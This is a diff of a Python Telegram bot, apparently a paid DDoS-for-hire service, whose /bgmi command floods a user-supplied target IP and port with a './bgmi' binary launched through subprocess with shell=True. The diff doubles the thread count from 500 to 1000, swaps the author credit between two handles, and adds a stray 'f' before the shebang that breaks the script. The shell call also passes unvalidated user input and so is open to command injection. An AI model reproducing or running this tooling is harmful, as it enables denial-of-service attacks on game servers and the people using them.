@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+f#!/usr/bin/python3
 #By @Khan_armaan_12
 
 import telebot
@@ -242,7 +242,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 1000"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By  @venomXcrazy
+ By  @Khan_armaan_12 
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -312,7 +312,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By @venomXcrazy'''
+By @Khan_armaan_12'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By  @venomXcrazy
+By  @Khan_armaan_12 
 '''
     bot.reply_to(message, response)
 
